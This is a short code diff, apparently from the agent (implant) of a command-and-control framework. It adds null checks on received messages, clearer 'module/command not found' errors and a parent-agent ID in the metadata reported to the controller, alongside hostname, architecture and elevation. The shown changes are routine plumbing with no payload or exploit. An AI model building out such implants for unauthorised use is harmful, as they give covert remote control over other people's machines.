@@ -56,13 +56,16 @@ namespace Agent.Controllers
             {
                 if (CommModule.RecvData(out AgentMessage Message))
                 {
-                    if (Message.AgentID.Equals(AgentID, StringComparison.OrdinalIgnoreCase))
+                    if (Message != null && Message.Data != null)
                     {
-                        HandleAgentMessage(Message);
-                    }
-                    else
-                    {
-                        P2PController.ForwardMessage(Message);
+                        if (Message.AgentID.Equals(AgentID, StringComparison.OrdinalIgnoreCase))
+                        {
+                            HandleAgentMessage(Message);
+                        }
+                        else
+                        {
+                            P2PController.ForwardMessage(Message);
+                        }
                     }
                 }
             }
@@ -80,7 +83,7 @@ namespace Agent.Controllers
 
                 if (module == null)
                 {
-                    SendMessage("Requested module not found");
+                    SendMessage($"Requested module ({task.Module}) not found");
                 }
                 else
                 {
@@ -88,7 +91,7 @@ namespace Agent.Controllers
 
                     if (command == null)
                     {
-                        SendMessage($"Request command not found in module {module}");
+                        SendMessage($"Requested command ({task.Command}) not found in module {task.Module}");
                     }
                     else
                     {
@@ -105,6 +108,7 @@ namespace Agent.Controllers
             var metadata = new AgentMetadata
             {
                 AgentID = AgentID,
+                ParentAgentID = ParentAgentID,
                 Arch = Helpers.GetArchitecture,
                 Elevation = Helpers.GetIntegrity,
                 Hostname = Helpers.GetHostname,
